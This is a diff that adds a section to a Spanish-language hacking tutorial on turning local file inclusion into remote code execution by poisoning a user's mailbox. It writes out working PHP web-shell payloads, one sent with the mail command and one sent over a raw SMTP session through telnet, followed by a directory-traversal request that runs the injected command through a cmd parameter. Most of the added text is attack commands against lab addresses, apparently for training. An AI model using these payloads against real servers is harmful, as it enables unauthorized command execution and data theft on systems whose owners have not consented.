@@ -143,4 +143,55 @@ Si logramos incrustar código PHP en el log y que luego sea interpretado, podrem
 - Si el log se interpreta como PHP, ejecutamos código remoto usando el parámetro `cmd` para pasar el comando  
 - Esto permite ejecutar comandos en el servidor y leer archivos sensibles
 
+En algunos casos podremos hacer lo mismo vía mail:
+
+```bash
+mail -s "<?php system(\$_GET['cmd']); ?>" www-data@10.10.10.10 < /dev/null
+```
+Este comando envía un correo con un payload PHP en el asunto al usuario www-data.
+
+O directamente mandando un mail, supongamos que sabemos de la existencia de www-data:
+```bash
+telnet 172.17.0.2 25
+
+HELO localhost
+
+MAIL FROM:<root>
+
+RCPT TO:<www-data>
+
+DATA
+
+<?php
+echo shell_exec(\$_REQUEST['cmd']);
+?>
+.
+QUIT
+```
+Aquí abrimos una sesión SMTP vía telnet, enviamos un correo con código PHP malicioso que ejecuta comandos recibidos por el parámetro cmd.
+El punto . indica el fin del cuerpo del mensaje, y QUIT cierra la conexión.
+
+Luego ejecutaremos:
+```
+curl "http://172.17.0.2/test.php?page=../../../../../var/mail/www-data&cmd=id"
+```
+Con esta petición accedemos al archivo de correo de www-data usando LFI y ejecutamos el comando id para obtener información del usuario.
+
+O vía URL:
+```
+http://172.17.0.2/test.php?page=../../../../../var/mail/www-data&cmd=id
+```
+Es lo mismo que el curl pero desde un navegador.
+
+Notas importantes:
+
+Se usa shell_exec en el payload PHP para ejecutar comandos del sistema recibidos a través del parámetro cmd.
+
+  -La ruta ../../../../../var/mail/www-data accede al archivo de correo del usuario www-data mediante LFI.
+
+  -Es fundamental usar &cmd=id para añadir el parámetro que ejecuta el comando en el PHP inyectado.
+
+  -El puerto 25 es el estándar para SMTP y debe indicarse en la conexión telnet.
+
+  -El punto . en telnet indica el fin del mensaje SMTP.
 
